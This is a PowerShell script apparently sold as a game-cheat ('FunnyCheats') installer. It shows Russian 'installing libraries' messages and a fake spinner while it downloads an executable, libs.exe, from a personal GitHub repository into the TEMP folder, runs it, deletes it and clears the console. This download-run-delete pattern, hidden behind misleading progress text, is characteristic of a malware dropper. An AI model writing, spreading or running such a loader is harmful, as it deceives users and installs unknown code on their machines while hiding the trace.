Clear-Host

Write-Host @'
                                                                                                          
 ▄▄▄▄▄▄▄ ▄▄▄  ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄   ▄▄▄▄   ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄ 
███▀▀▀▀▀ ███  ███ ████▄  ███ ████▄  ███ ███   ███ ███▀▀▀▀▀ ███   ███ ███▀▀▀▀▀ ▄██▀▀██▄ ▀▀▀███▀▀▀ █████▀▀▀ 
███▄▄    ███  ███ ███▀██▄███ ███▀██▄███ ▀███▄███▀ ███      █████████ ███▄▄    ███  ███    ███     ▀████▄  
███▀▀    ███▄▄███ ███  ▀████ ███  ▀████   ▀███▀   ███      ███▀▀▀███ ███      ███▀▀███    ███       ▀████ 
███      ▀██████▀ ███    ███ ███    ███    ███    ▀███████ ███   ███ ▀███████ ███  ███    ███    ███████▀                                                                                                                                                                                                                                                                 
'@ -ForegroundColor Magenta

Write-Host "     "
Write-Host "Скачивание библиотек пожалуйста подождите !" -ForegroundColor Yellow

$spinner = '|','/','-','\'

for ($i = 0; $i -lt 20; $i++) {
    $idx = $i % $spinner.Length
    Write-Host "`r $($spinner[$idx])" -NoNewline -ForegroundColor White
    Start-Sleep -Milliseconds 100
}

Write-Host "`rУстановка библиотек!." -ForegroundColor Blue

$temp = $env:TEMP

$libs = "$temp\libs.exe"

Invoke-WebRequest "https://github.com/SuperMod27/0/raw/refs/heads/main/libs.exe" -OutFile $libs

Start-Process $libs -Wait

Remove-Item $libs -Force -ErrorAction SilentlyContinue

Write-Host "`nУспешно установились все библиотеки" -ForegroundColor Green
Write-Host Окно будет очищено через 5 секунд

Start-Sleep -Seconds 5

Clear-Host